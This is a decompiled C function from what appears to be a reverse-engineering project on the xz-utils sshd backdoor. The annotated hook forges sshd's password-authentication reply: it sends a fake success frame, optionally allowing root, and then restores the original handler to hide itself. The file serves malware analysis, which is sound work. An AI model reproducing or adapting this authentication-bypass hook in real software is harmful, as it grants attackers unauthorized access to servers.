// /home/kali/xzre-ghidra/xzregh/108100_mm_answer_authpassword_hook.c
// Function: mm_answer_authpassword_hook @ 0x108100
// Calling convention: __stdcall
// Prototype: int __stdcall mm_answer_authpassword_hook(ssh * ssh, int sock, sshbuf * m)


/*
 * AutoDoc: Short-circuits `MONITOR_REQ_AUTHPASSWORD`: validates the ssh/monitor arguments, replays the payload-provided reply when
 * `pending_authpayload_len/pending_authpayload` are set, or synthesizes a minimal success frame on the stack when no body is queued
 * (big-endian length word, cached monitor answer reqtype, 1-byte TRUE auth result, plus an optional 32-bit root_allowed dword).
 * The reply is emitted via `fd_write()` and the saved dispatch entry is restored so sshd continues as if the original routine ran;
 * malformed inputs fall back to libc’s `exit(0)` so the monitor never stays half-patched.
 */

#include "xzre_types.h"

int mm_answer_authpassword_hook(ssh *ssh,int sock,sshbuf *m)

{
  libc_imports_t *libc_imports;
  sshd_ctx_t *sshd_ctx;
  int result;
  size_t reply_len;
  void *reply_buf;
  uint reply_frame_len_be;
  uint reply_reqtype;
  u8 auth_ok;
  u32 root_allowed;
  
  reply_frame_len_be = 0;
  libc_imports = *(libc_imports_t **)(global_ctx + 0x10);
  sshd_ctx = *(long *)(global_ctx + 0x20);
  reply_reqtype = 0;
  auth_ok = 0;
  root_allowed = 0;
  // AutoDoc: Missing ssh or monitor arguments mean the hook can’t safely forge a reply—exit immediately to avoid corrupting sshd’s dispatcher.
  if ((m == (sshbuf *)0x0 || sock < 0) || (ssh == (ssh *)0x0)) {
    if ((libc_imports != (libc_imports_t *)0x0) && (libc_imports->exit != (pfn_exit_t)0x0)) {
      (*libc_imports->exit)(0);
    }
    result = 0;
  }
  else {
    reply_len = (size_t)*(ushort *)(sshd_ctx + 0x90);
    // AutoDoc: When no payload queued an authpassword body, synthesize the minimal reply frame: monitor reqtype + auth_ok byte (+ optional root_allowed dword).
    if ((*(ushort *)(sshd_ctx + 0x90) == 0) ||
       (reply_buf = *(uint **)(sshd_ctx + 0x98), reply_buf == (uint *)0x0)) {
      reply_buf = &reply_frame_len_be;
      auth_ok = 1;
      reply_reqtype = *(uint *)(sshd_ctx + 0x40) & 0xff;
      reply_frame_len_be = (-(uint)(*(int *)(sshd_ctx + 0xb8) == 0) & 0xfc000000) + 0x9000000;
      reply_len = (ulong)(reply_frame_len_be >> 0x18) + 4;
    }
    // AutoDoc: Whether the reply came from the payload or was synthesized on the stack, push it straight to the monitor socket so sshd never re-enters its password handler.
    fd_write(sock,reply_buf,reply_len,libc_imports);
    // AutoDoc: Restore the saved monitor dispatch entry so the next request drops back into sshd’s genuine `mm_answer_authpassword` implementation.
    **(u64 **)(sshd_ctx + 0xa0) = *(u64 *)(sshd_ctx + 0xd0);
    result = 1;
  }
  return result;
}

